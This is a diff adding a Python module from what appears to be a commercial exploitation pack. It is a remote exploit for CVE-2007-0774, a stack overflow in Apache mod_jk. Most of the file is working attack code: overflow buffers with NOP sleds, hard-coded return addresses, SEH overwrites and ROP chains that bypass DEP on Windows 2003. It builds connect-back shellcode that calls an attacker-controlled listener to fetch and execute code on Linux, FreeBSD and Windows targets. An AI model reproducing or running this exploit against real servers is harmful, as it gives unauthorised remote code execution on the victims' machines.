@@ -1,0 +1,292 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+
+import sys
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine 
+
+from MOSDEF import mosdef
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import *
+from encoder import chunkedaddencoder
+from struct import *
+
+# GUI info
+NAME = "Apache Tomcat JK Web Server Connector Stack Overflow Vulnerability"
+
+DESCRIPTION = "Stack Overflow Vulnerability in Apache Tomcat JK Web Server Connector"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = "Apache"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = "2007.03.02"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-07-008/"
+DOCUMENTATION["Versions Affected"] = "Apache mod_jk 1.2.19 and 1.2.20"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2007-0774"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0774"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"], ["Linux"], ["FreeBSD"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets={
+    1: ['GNU/Linux Debian 3.1 - mod_jk 1.2.19 / 1.2.20'],
+    2: ['FreeBSD All versions - mod_jk 1.2.19 / 1.2.20'],
+    3: ['Windows All versions - mod_jk 1.2.20'],
+    4: ['Windows XP SP2 US - mod_jk 1.2.19'],
+    5: ['Windows 2003 SP1 US with DEP - mod_jk 1.2.20'],
+    6: ['Windows 2003 SP2 US with DEP - mod_jk 1.2.20'],
+}
+
+
+class theexploit (tcpexploit):
+
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.shellcode = None
+		self.version = 1
+		self.badstring="\x00\x01\x07\x08\x09\x0a\x0b\x0c\x0d\x23\\/.:?;%?~\" "
+		return
+
+
+	def getargs(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port", self.port))
+		self.ssl = self.argsDict.get("ssl", self.ssl)
+		return 
+
+
+	def createShellcode(self):
+		localhost = self.callback.ip
+		localport = self.callback.port
+		if self.version == 0:
+			s = shellcodeGenerator.linux_X86()
+			s.addAttr("connect",{"ipaddress":localhost,"port":localport})
+			s.addAttr("read_and_exec",{"fdreg": "esi"})
+			shellcode = s.get()
+			encoder = chunkedaddencoder.intelchunkedaddencoder()
+			encoder.setbadstring(self.badstring)
+			self.shellcode = encoder.encode(shellcode)  
+		elif self.version == 1:
+                	self.shellcode = self.createFreeBSDCallbackShellcode(localhost, localport)
+		elif self.version == 2 or self.version == 3 or self.version == 4 or self.version == 5:
+			self.shellcode = self.createWin32Shellcode(self.badstring, localhost, localport)
+		return
+
+
+	def neededListenerTypes(self):
+		if self.version == 0:
+			return [canvasengine.LINUXMOSDEF_INTEL]
+		elif self.version == 1:
+			return [canvasengine.FREEBSDMOSDEF_INTEL]
+		elif self.version == 2 or self.version == 3 or self.version == 4 or self.version == 5:
+			return [canvasengine.WIN32MOSDEF_INTEL]
+		else:
+			self.log("ListenerTypes: Version not %d supported!" % self.version)
+		return
+
+
+	def run(self):
+		self.getargs()
+		self.version = self.argsDict["version"]
+		self.log("Connecting to %s:%d" % (self.host, self.port))
+
+		s = self.gettcpsock()
+		try:
+			s.connect((self.host, self.port))
+		except:
+			self.log("Could not connect to %s on port %d" % (self.host, self.port))
+			return 0
+
+		# Linux debian 3.1 - mod_jk 1.2.19 / 1.2.20
+		if self.version == 0:
+			string = "\x90" * 3000
+			string += self.shellcode
+			pad = 4111 - len(string)
+			string += "\x90" * pad
+			string += pack("<L", 0xbfffee9c)	# ret addr
+
+
+		# Freebsd - mod_jk 1.2.19 / 1.2.20
+		elif self.version == 1:
+			string = "\x90" * 2000
+			string += self.shellcode
+			pad = 4123 - len(string)
+			string += "\x90" * pad
+			string += pack("<L", 0xbfbfdc5a)	# ret addr
+
+		
+		# Windows - mod_jk 1.2.20 - SEH overwriting
+		# Really easy to exploit, 100% reliable.
+		# Doesn't work with DEP activated :x
+		elif self.version == 2:
+			sc_base = 16
+			string_l = list("a" * 5001)	
+			string_l[sc_base:sc_base + len(self.shellcode)] = self.shellcode
+			
+			# 4343 : Apache/1.3.37 (Win32) mod_jk/1.2.20
+			# 4407 : Apache/2.0.59 (Win32) mod_jk/1.2.20
+			# 4423 : Apache/2.2.3  (Win32) mod_jk/1.2.20
+			for seh_offset in [ 4343, 4407, 4423 ]:
+				string_l[seh_offset - 9 : seh_offset - 9 + 5] = "\xe9" + pack("<L", sc_base - seh_offset + 4) # jmp shellcode
+				string_l[seh_offset - 4 : seh_offset - 4 + 2] = "\xeb\xf9"		# jmp short
+				string_l[seh_offset     : seh_offset + 4] = pack("<L", 0x6a6b8ef1)	# pop / pop / ret @ mod_jk.so
+			string = ''.join(string_l)
+
+
+		# Windows XP US SP2 - mod_jk 1.2.19 - 
+		# This one is pretty diffult to exploit because we can use SEH overwriting and we need 
+		# to use a trick to use a 'jmp esp' because
+		# we can't complety overwrite the first arg on stack :
+		#
+		# [ BUFFER ] [ RET ] [ ARG 1 ]
+		#
+		# RET will be a 'jmp esp' address, jump esp jump on ARG 1 addr. ARG 1 must be a pointer to a NULL word
+		# (or mod_jk crach), and two less significant byte must be a jmp short opcode to return in our shellcode.
+		#
+		#
+		# The buffer look like this :
+		# GET  / [SHELLCODE] [NOP] [LABEL1: JMP SHELLCODE] [NOP] [RET ADDR (JMP ESP)] [[JMP LABEL1] [\x6c\x6a]]
+		# "GET /" . "\x90"x3996 . "\xe9\x5f\xf0\xff\xff"  . "\x90"x102 . "\x65\x82\xa5\x7c" . "\xeb\x8f\x6c\x6a" . " HTTP/1.0\r\n\r\n"'
+		#
+		#
+		# Because we are on top of stack we need to move shellcode in stack or loadlibrarya erase or shellcode: 
+		# GET  / [SHELLCODE] [NOP] [LABEL1: memcpy(dst, SHELLCODE), JMP dst] [NOP] [RET ADDR (JMP ESP)] [[JMP LABEL1] [\x6c\x6a]]
+		# 
+		# memcpy(dst, SHELLCODE) ; JMP dst :
+		# 0473FDF1   EB 1f            JMP SHORT 0473FE12
+		# 0473FDF3   5D               POP EBP
+		# 0473FDF4   8DB5 3CF0FFFF    LEA ESI,DWORD PTR SS:[EBP-FC4]
+		# 0473FDFA   8DBD E7E1FFFF    LEA EDI,DWORD PTR SS:[EBP-1E19]
+		# 0473FE00   33C9             XOR ECX,ECX
+		# 0473FE02   66:B9 AC03       MOV CX,3AC
+		# 0473FE06   F3:A4            REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[>
+		# 0473FE08   8D85 E7E1FFFF    LEA EAX,DWORD PTR SS:[EBP-1E19]
+		# 0473FE0E   FFE0             JMP EAX
+		# 0473FE10   90               NOP
+		# 0473FE11   90               NOP
+		# 0473FE12   90               NOP
+		# 0473FE13   90               NOP
+		# 0473FE14   E8 DAFFFFFF      CALL 0473FDF3
+
+		elif self.version == 3:
+			string_l = list("\x90" * 4103)
+			#string_l[0:8] = "\x31\xC0\x66\xB8\x58\x01\x01\xc4"			
+			string_l[0:0 + len(self.shellcode)] = self.shellcode
+			mymemcpy = "\xEB\x1f\x5D\x8D\xB5\x3C\xF0\xFF\xFF\x8D\xBD\xE7\xE1\xFF\xFF\x33\xC9\x66\xB9\xAC\x03\xF3\xA4"
+			mymemcpy += "\x8D\x85\xE7\xE1\xFF\xFF\xFF\xE0\x90\x90\x90\x90\xE8\xDA\xFF\xFF\xFF"
+			string_l[3996:3996 + len(mymemcpy)] = mymemcpy			
+			string = ''.join(string_l)
+			string += "\x65\x82\xa5\x7c" # JMP ESP in shell32.dll, try to change this value if exploit failed
+			string += "\xeb\x8f\x6c\x6a" # This value is explain below
+
+		elif self.version == 4 or self.version == 5:
+			string_l = list("\x90" * 4095)
+			string_l[64:64 + len(self.shellcode)] = self.shellcode
+
+			# same problem here we have to move the shellcode
+			mymemcpy = "\xEB\x1f\x5D\x8D\xB5\x78\xF0\xFF\xFF\x8D\xBD\xE7\xE1\xFF\xFF\x33\xC9\x66\xB9\xAC\x03\xF3\xA4"
+			mymemcpy += "\x8D\x85\xE7\xE1\xFF\xFF\xFF\xE0\x90\x90\x90\x90\xE8\xDA\xFF\xFF\xFF"
+			string_l[3992:3992 + len(mymemcpy)] = mymemcpy
+			string = ''.join(string_l)
+			
+			# win 2003 sp1 US
+			if self.version == 4:
+				# ret chain :
+				# 0x7c9851bd // mov al, 1 / ret @ shell32
+				# 0x6a6cdfa1 // ret @ mod_jk
+				# 0x7c911f56 // push esp / pop ebp / ret 4 @ shell32
+				# 0x7c93cbfb // dec ebp / ret  @ shell32
+				# 0x7c835947 // LdrpCheckNXCompatibility @ ntdll		
+				# 0x7c93cdea // jmp esp @ shell32
+
+				string += pack("<L", 0x7c9851bd) 	# mov al, 1 / ret @ shell32
+				string += pack("<L", 0x6a6cdfa1) 	# ret @ mod_jk
+				string += "junk"
+				string += pack("<L", 0x7c93cdea) 	# jmp esp @ shell32
+				string += "junk"
+				string += "\xeb\x80" 			# jmp short
+				string += "ju"
+				string += pack("<L", 0x7c911f56) 	# push esp / pop ebp / ret 4 @ shell32
+				string += pack("<L", 0x7c93cbfb) 	# dec ebp / ret  @ shell32
+				string += "junk"
+				string	+= (pack("<L", 0x7c93cbfb) * 19)	# dec ebp / ret  @ shell32
+				string += pack("<L", 0x7c835947) 	# LdrpCheckNXCompatibility @ ntdll
+
+			# win 2003 sp2 US
+			if self.version == 5:
+				string += pack("<L", 0x7cab5e1b)	# mov al, 1 / ret 0x01 @ shell32
+				string += pack("<L", 0x6a6cdfa1)	# ret @ mod_jk
+				string += "junk"
+				string += pack("<L", 0x7c969673) 	# jmp esp @ shell32
+				string += "junk"
+				string += "\xeb\x80" 			# jmp short
+				string += "ju"
+				string += pack("<L", 0x7c93c8a9) 	# push esp / pop ebp / ret 4 @ shell32
+				string += pack("<L", 0x77396a8c)	# dec ebp / ret  @ user32
+				string += "junk"
+				string += (pack("<L", 0x77396a8c) * 19)	# dec ebp / ret  @ user32
+				string += pack("<L", 0x7c8343a9)	# LdrpCheckNXCompatibility @ ntdll
+
+		else:
+			self.log("run: Version not %d supported!" % self.version)
+			return
+
+		string += (" HTTP/1.1\r\nHost: %s\r\n\r\n" % self.host)
+
+		try:
+			s.sendall("GET /" + string)
+		except:
+			self.log("Send error: couln'd send payload.")
+			return 0
+
+		self.log("Done sending attack buffer.")
+		s.close()
+		ret = self.ISucceeded()
+		if not ret:
+			self.log("Sleeping for two seconds to check for callback")
+			time.sleep(2)
+			ret = self.ISucceeded()
+		return ret
+
+
+	def displayVersions(self):
+		i = 0
+		print 'Available versions:'
+		for listline in targets.values():
+		    print "\t%d: %s" % (i, listline[0])
+		    i += 1
+
+
+	def usage(self):
+		print "Usage: %s -v version -t targethost -p port -l localip -d localport\n" % (sys.argv[0])
+		self.displayVersions()
+		sys.exit(0)
+
+
+if __name__ == '__main__':
+	app = theexploit()
+	ret = standard_callback_commandline(app)
+
